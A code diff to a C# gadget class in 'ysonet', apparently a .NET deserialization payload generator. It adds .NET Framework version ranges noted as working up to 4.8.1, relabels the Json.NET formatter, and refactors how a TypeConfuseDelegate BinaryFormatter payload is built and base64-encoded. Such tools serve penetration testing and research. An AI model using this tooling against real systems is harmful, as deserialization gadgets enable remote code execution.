@@ -14,7 +14,9 @@ namespace ysonet.Generators
         {
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.NestedDeserialization)
-                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
+                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
+                // getter-call chain; fired on 4.8.1
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
         }
 
         // SecurityException + Getter call gadget
@@ -31,7 +33,9 @@ namespace ysonet.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.NET" };
+            // The "(N)" suffix is a display-only annotation meaning "this formatter
+            // carries N variants". All four getter chains are Json.NET templates.
+            return new List<string> { "Json.NET (4)" };
         }
 
         public override string Finders()
@@ -82,8 +86,8 @@ namespace ysonet.Generators
             }
             else
             {
-                IGenerator generator = new TypeConfuseDelegateGenerator();
-                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+                binaryFormatterPayload = (byte[])new TypeConfuseDelegateGenerator()
+                    .GenerateInner("BinaryFormatter", inputArgs);
             }
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
